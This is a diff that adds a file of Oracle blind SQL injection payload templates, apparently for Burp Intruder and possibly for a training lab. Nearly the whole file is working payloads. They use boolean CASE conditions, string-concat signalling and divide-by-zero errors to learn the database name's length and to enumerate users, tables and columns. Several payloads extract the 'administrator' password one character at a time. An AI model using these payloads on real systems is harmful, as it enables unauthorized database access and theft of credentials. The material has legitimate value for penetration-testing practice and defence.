@@ -1,0 +1,70 @@
+# Oracle Boolean-Blind Intruder Templates
+# Usage:
+# - Insert into vulnerable parameter; mark placeholders §…§.
+# - Placeholders: §N§ (length), §POS§ (char index), §CUT§ (ASCII threshold), §ROW§ (1-based row number), §TABLE§ (table name), §CHAR§ (literal character)
+# - Two signaling styles:
+#   1) Non-concat boolean: =1 outcome via CASE WHEN … THEN 1 ELSE 0 END
+#   2) Concat signal: return 'a' in string concat when true to Grep-Match
+
+# --- Basic environment checks ---
+# Non-concat: DB name length > N
+' AND (SELECT CASE WHEN LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Concat: signal 'a' if DB name length > N
+'||(SELECT CASE WHEN LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>§N§ THEN 'a' ELSE '' END FROM dual)||'
+
+# --- Schema/user enumeration ---
+# Users exist (non-concat)
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Username length (alphabetical, by row)
+' AND (SELECT CASE WHEN LENGTH((SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM all_users) WHERE rn=§ROW§))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Username char > CUT
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM all_users) WHERE rn=§ROW§),§POS§,1))>§CUT§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Username char == literal (concat signal)
+'||(SELECT CASE WHEN SUBSTR((SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM all_users) WHERE rn=§ROW§),§POS§,1)='§CHAR§' THEN 'a' ELSE '' END FROM dual)||'
+
+# --- Table enumeration (current user) ---
+# Any user tables (non-concat)
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM user_tables)>0 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Table name length (by row)
+' AND (SELECT CASE WHEN LENGTH((SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) rn FROM user_tables) WHERE rn=§ROW§))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Table name char > CUT
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) rn FROM user_tables) WHERE rn=§ROW§),§POS§,1))>§CUT§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Table name char == literal (concat signal)
+'||(SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) rn FROM user_tables) WHERE rn=§ROW§),§POS§,1)='§CHAR§' THEN 'a' ELSE '' END FROM dual)||'
+
+# --- Column enumeration (specific table) ---
+# Column count for table (non-concat)
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM user_tab_columns WHERE table_name='§TABLE§')>0 THEN 1 ELSE 0 END FROM dual)=1-- 
+# Column name length (by row)
+' AND (SELECT CASE WHEN LENGTH((SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY column_id) rn FROM user_tab_columns WHERE table_name='§TABLE§') WHERE rn=§ROW§))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Column name char > CUT
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY column_id) rn FROM user_tab_columns WHERE table_name='§TABLE§') WHERE rn=§ROW§),§POS§,1))>§CUT§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Column name char == literal (concat signal)
+'||(SELECT CASE WHEN SUBSTR((SELECT column_name FROM (SELECT column_name, ROW_NUMBER() OVER (ORDER BY column_id) rn FROM user_tab_columns WHERE table_name='§TABLE§') WHERE rn=§ROW§),§POS§,1)='§CHAR§' THEN 'a' ELSE '' END FROM dual)||'
+
+# --- Username/password extraction (examples) ---
+# Enumerate usernames (non-concat)
+' AND (SELECT CASE WHEN LENGTH((SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM all_users) WHERE rn=§ROW§))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM all_users) WHERE rn=§ROW§),§POS§,1))>§CUT§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Extract password for a known user from users table (non-concat)
+' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>§N§ THEN 1 ELSE 0 END FROM dual)=1-- 
+' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),§POS§,1))>§CUT§ THEN 1 ELSE 0 END FROM dual)=1-- 
+# Concat signaling variants for length/char
+'||(SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>§N§ THEN 'a' ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),§POS§,1))>§CUT§ THEN 'a' ELSE '' END FROM dual)||'
+
+# --- Concat intruder (TrackingId-style) ---
+# Error toggles (true → 500 via divide-by-zero; false → 200). Adjust username and table as needed.
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+# Table existence (no error when table exists and ROWNUM filters to 1 row)
+'||(SELECT '' FROM users WHERE ROWNUM=1)||'
+# Length probe for a known user's password - increment N until error stops; final length is last true.
+'||(SELECT CASE WHEN LENGTH(password)>§N§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+# Character equality at position POS. Character list set at CHAR
+'||(SELECT CASE WHEN SUBSTR(password,§POS§,1)='§CHAR§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+# Notes:
+# - This template uses analytic ROW_NUMBER() for pagination; set §ROW§ as a 1-based row number.
+# - Keep doubled single quotes for string literals inside SYS_CONTEXT and CASE.
+
